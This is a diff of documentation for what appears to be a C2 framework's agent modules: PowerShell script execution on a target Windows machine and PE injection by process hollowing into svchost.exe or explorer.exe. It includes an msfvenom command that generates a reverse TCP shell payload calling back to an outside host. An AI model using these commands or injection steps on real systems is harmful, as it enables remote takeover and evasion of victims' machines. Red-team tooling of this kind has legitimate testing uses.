@@ -2,7 +2,7 @@
 
 ## Powershell
 
-This `pwsh` module helps operators run their own extendible powershell scripts on a targest's Windows machine via an active agent session
+This `pwsh` module helps operators run their own extendible powershell scripts on a target's Windows machine via an active agent session
 
 ### Compatibility:
 - Go_agent
@@ -14,7 +14,18 @@ This `pwsh` module helps operators run their own extendible powershell scripts o
 ```
 modules info pwsh
 pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
+# Examples:
+pwsh my_script.ps1
+pwsh my_script.ps1 agent_id=abc123-4567-8901-2345-67890abcdef1
+pwsh my_script.ps1 arguments="-param1 value1 -param2 value2"
 ```
+
+### File Location Resolution
+When only a script filename is provided (without a full path), the module will automatically search for the PowerShell script in the following locations in order:
+1. `modules/external/<filename>` - The general external directory
+2. Direct relative paths from the current working directory
+
+If the PowerShell script is not found, the command will return an error.
 
 ## Execute-BOF
 
@@ -150,17 +161,26 @@ This module interfaces with an agent and enables In-memory Injection of an unman
 
 #### Usage
 1. Generate compatible PE payload using msfvenom
-2. Parse the `pe_file` path on the C2 server as a required argument of the peinject module
-3. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
+2. Place the PE file in the `modules/external/` directory on the C2 server
+3. Parse the `pe_file` name (path will be resolved automatically) as a required argument of the peinject module
+4. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
 
 #### msfvenom Command Syntax
 
 ```
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
 
-peinject pe_file=<payload_path> # METHOD - 1 (Interactive mode)
-run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+peinject pe_file=<payload_filename> # METHOD - 1 (Interactive mode) - File will be resolved automatically
+run peinject pe_file=<payload_filename> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+# Examples:
+peinject pe_file=payload.exe
+peinject pe_file=payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
 ```
+
+#### File Location Resolution
+When only a filename is provided (without a full path), the module will automatically search for the PE file in the following locations in order:
+1. `modules/external/<filename>` - The general external directory
+2. Direct relative paths from the current working directory
 
 #### PE Injection Flow
 1. Parses and validates the DOS header and NT headers to ensure the file is a valid PE
